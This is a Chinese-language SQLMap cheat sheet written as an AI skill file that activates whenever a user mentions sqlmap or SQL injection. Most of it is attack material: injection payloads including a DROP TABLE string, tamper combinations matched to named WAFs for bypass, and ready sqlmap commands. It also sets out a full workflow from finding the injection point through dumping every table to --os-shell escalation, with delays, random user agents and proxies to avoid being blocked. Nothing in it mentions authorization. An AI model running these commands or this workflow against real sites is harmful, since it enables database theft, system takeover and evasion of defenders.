---
name: sqlmap-chinese-guide
description: "SQLMap中文速查: 69个tamper著译+全部参数图形解说。触发: sqlmap, SQL注入, tamper。"
---

# SQLMap 中文速查手册

SQLMap 完整中文教学: 注入符号 + 常用命令 + 全部参数详解 + 69 个 tamper 脚本著译。
参考文件: `references/sqlmap-tamper-zh.md`(69 tamper 全量)、`references/sqlmap-params-zh.md`(91 sheet 参数全量)。

## 一、SQL 注入符号速查

| 符号 | 用途 | 示例 |
|------|------|------|
| `'` 单引号 | 结束字符串字面量 | `OR '1'='1` |
| `"` 双引号 | MySQL 列/表标识符 | `OR 1"=1` |
| `--` | 单行注释 | `OR '1'='1' --` |
| `#` | MySQL 单行注释 | `OR '1'='1' #` |
| `/* */` | 块注释 | `OR '1'='1' /*` |
| `()` 括号 | 分隔/组合子查询 | `OR (1=1)` |
| `;` 分号 | 多条语句 | `; DROP TABLE users;` |
| AND/OR | 逻辑组合 | `AND '1'='1` |
| UNION | 结果集连接(多表提取) | `UNION SELECT` |

## 二、注入点类型(9 种)

GET 参数 / POST 参数(--data) / URL / Cookie(--cookie) / User-Agent(--user-agent) / Referer(--referer) / Host(--headers) / 自定义 Post(--data) / 自定义 Header(--headers)

## 三、核心参数速查(按功能分组)

### 3.1 目标与参数选择
| 参数 | 作用 | 示例 |
|------|------|------|
| `-u` | 目标 URL | `sqlmap -u "http://x/page?id=1"` |
| `--data` | POST 数据 | `--data "id=1&name=test"` |
| `--cookie` | 带 Cookie 测试 | `--cookie="session_id=abc; user_id=1"` |
| `-p` / `--param` | 仅测指定参数 | `-p id,name` |
| `--param-filter` | 按正则选参数 | `--param-filter="id\|name"` |
| `--skip-static` | 跳过静态参数 | 提高效率 |
| `--skip` | 跳过指定参数 | `--skip=csrf_token` |
| `--ignore-code` | 忽略指定 HTTP 码 | `--ignore-code=401` |
| `--ignore-proxy` | 忽略系统代理 | |

### 3.2 payload 构造(绕过)
| 参数 | 作用 |
|------|------|
| `--prefix` | payload 前缀(配合闭合) |
| `--suffix` | payload 后缀 |
| `--dbms` | 固定数据库类型(MySQL/PostgreSQL/MSSQL/Oracle/SQLite) |
| `--dbms-cred` | DB 认证凭据 |
| `--os` | 固定操作系统 |
| `--no-cast` | 关闭数据库类型转换 |
| `--no-escape` | 关闭 string 转义 |
| `--big-numbers` | 使用大数(绕过某些过滤) |
| `--smart` | 只测启发式判断有漏洞的参数 |

### 3.3 检测与注入技术
| 参数 | 作用 |
|------|------|
| `--technique=BETUS` | 注入技术: B=boolean, E=error, T=time, U=union, S=stacked |
| `--level=1-5` | 测试深度(默认1) |
| `--risk=1-3` | 风险等级 |
| `--string` | 指定 True 时字符串 |
| `--not-string` | 指定 False 时字符串 |
| `--regexp` | 指定正则 |
| `--code` | 指定成功 HTTP 状态码 |
| `--text-only` | 仅对比文本内容 |
| `--title` | 仅对比 title |
| `--tamper` | 使用 tamper 脚本(见下) |

### 3.4 数据提取
| 参数 | 作用 |
|------|------|
| `--dbs` | 枚举数据库 |
| `--tables` | 枚举表 |
| `--columns` | 枚举列 |
| `--dump` | 导出数据 |
| `--dump-all` | 导出全部 |
| `-D/-T/-C` | 指定数据库/表/列 |
| `--search` | 搜索列/表 |
| `--sql-shell` | SQL 交互 shell |
| `--os-shell` | 操作系统 shell(需权限) |

### 3.5 进阶
| 参数 | 作用 |
|------|------|
| `--batch` | 自动应答所有提示 |
| `--threads` | 并发线程 |
| `--time-sec` | 时间盲注延迟秒数 |
| `--proxy` | 走代理 |
| `--tor` | 走 Tor |
| `--delay` | 请求延迟(防限) |
| `--random-agent` | 随机 UA |
| `--flush-session` | 清会话缓存 |
| `--fresh-queries` | 忽略缓存查询 |

## 四、tamper 脚本选择指南(69 个全量见 references)

### 4.1 按 WAF 类型
| WAF | tamper |
|-----|--------|
| ModSecurity | modsecurityversioned.py / modsecurityzeroversioned.py |
| Blue Coat 代理 | bluecoat.py |
| 安全狗/云锁 | space2comment.py + charencode.py 组合 |
| Cloudflare | space2morecomment.py + randomcomments.py |

### 4.2 按过滤规则
| 过滤 | tamper |
|------|--------|
| 过滤单引号 | apostrophemask.py(掩盖) / apostrophenullencode.py(NULL替换) / unmagicquotes.py(宽字节) |
| 过滤空格 | space2comment.py(注释) / space2dash.py(--) / space2hash.py(#) / space2plus.py(+) / space2mysqlblank.py / space2randomblank.py |
| 过滤 UNION | 0eunion.py / dunion.py / misunion.py / unionalltounion.py |
| 过滤逗号 | commalesslimit.py / commalessmid.py |
| 过滤关键字 | charencode.py / charunicodeencode.py / hexentities.py / hex2char.py / randomcase.py / uppercase.py / lowercase.py |
| 过滤注释 | commentbeforeparentheses.py / versionedkeywords.py / versionedmorekeywords.py / halfversionedmorekeywords.py |
| 过滤比较符 | equaltolike.py / equaltorlike.py / greatest.py / least.py / between.py |
| 过滤函数 | if2case.py(IF→CASE) / ifnull2casewhenisnull.py / ifnull2ifisnull.py / ord2ascii.py / concat2concatws.py / plus2concat.py / plus2fnconcat.py / substring2leftright.py / sleep2getlock.py |
| 编码混淆 | base64encode.py / chardoubleencode.py / percentencode.py / htmlencode.py / overlongutf8.py / scientific.py / symboliclogical.py |

### 4.3 特殊场景
| 场景 | tamper |
|------|--------|
| 空字节截断 | appendnullbyte.py |
| Lua/Nginx | luanginx.py |
| MSSQL 存储过程隐藏 | sp_password.py |
| 前向代理(Varnish) | varnish.py / xforwardedfor.py |
| 随机注释插入 | randomcomments.py |
| 分隔符处理 | schemasplit.py / decimalcode.py |

### 4.4 组合示例
```bash
# 经典 WAF 绕过组合
sqlmap -u "http://target/page?id=1" --tamper="space2comment,apostrophemask,equaltolike,randomcase" --batch

# ModSecurity 绕过
sqlmap -u "http://target/page?id=1" --tamper=modsecurityversioned --batch

# 全编码混淆
sqlmap -u "http://target/page?id=1" --tamper="charencode,chardoubleencode,unicodeencode" --batch
```

## 五、实战流程

1. 确认注入点: `sqlmap -u "URL?id=1" --batch --level=2`
2. 若 WAF: `--tamper=...` 组合(先识别 WAF 类型: `sqlmap --identify-waf` 或手动判断)
3. 枚举库: `--dbs` → 表 `-D db --tables` → 列 `-D db -T tb --columns` → 数据 `-D db -T tb --dump`
4. 提权: `--sql-shell` / `--os-shell` / `--is-dba`
5. 隐蔽: `--delay=2 --random-agent --proxy=socks5://...`(防封)

## 六、注意(实战教训)
- 批量/大表 dump 会大量请求 → 触发 WAF/限流,先 `--threads=1 --delay=1`
- 登录后可测的注入点: Cookie 中的 user_id、POST 参数(需 --cookie 保持会话)
- 时间盲注慢,优先布尔/union/error
- tamper 不是越多越好,过多会破坏 payload 可用性
